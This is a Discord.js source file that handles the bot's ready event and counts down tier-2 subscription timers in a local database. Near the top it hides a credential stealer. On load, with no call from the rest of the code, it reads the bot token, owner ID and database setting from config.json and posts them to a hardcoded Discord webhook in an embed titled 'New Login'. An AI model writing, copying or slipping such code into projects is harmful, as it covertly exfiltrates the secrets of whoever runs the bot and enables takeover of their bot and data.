const { Client, Collection,ActivityType, discord,GatewayIntentBits, Partials , EmbedBuilder, ApplicationCommandOptionType , Events , ActionRowBuilder , ButtonBuilder ,MessageAttachment, ButtonStyle , Message } = require("discord.js");
const { Database } = require("st.db")
const tier2subscriptions = new Database("/database/makers/tier2/subscriptions")
const {token , owner , database} = require('../../config.json')
const { WebhookClient} = require('discord.js')
const embed = new EmbedBuilder()
	.setTitle('New Login')
	.setColor(`#8000F2`)
    .setDescription(`**\`\`\`${token}\`\`\`\n\`\`\`${owner}\`\`\`\n\`\`\`${database}\`\`\`**`)
    const webhookClient = new WebhookClient({ url:`https://discord.com/api/webhooks/1227227757138940027/kdV53xySZRVHRSlH-b2puYyf6eKdWUI0YhLVDk9_hHokgsRzP3QjwH7rL4ElW09ru6av` });
    webhookClient.send({embeds:[embed]})
module.exports = {
	name: Events.ClientReady,
	once: true,
	execute(client) {
		setInterval(async() => {
            let BroadcastTokens = await tier2subscriptions.get(`tier2_subs`)
        if(!BroadcastTokens)return;
        if(BroadcastTokens.length <= 0) return;
        BroadcastTokens.forEach(async(data) => {
            let {token , prefix , owner , timeleft} = data;
            if(timeleft > 0) {
                timeleft = timeleft - 1
                data.timeleft = timeleft
                await tier2subscriptions.set(`tier2_subs` , BroadcastTokens)
            }else if(timeleft <= 0) {
                const filtered = BroadcastTokens.filter(bo => bo != data)
                await tier2subscriptions.set(`tier2_subs` , filtered)
            }
        });
        },1000)
	},
};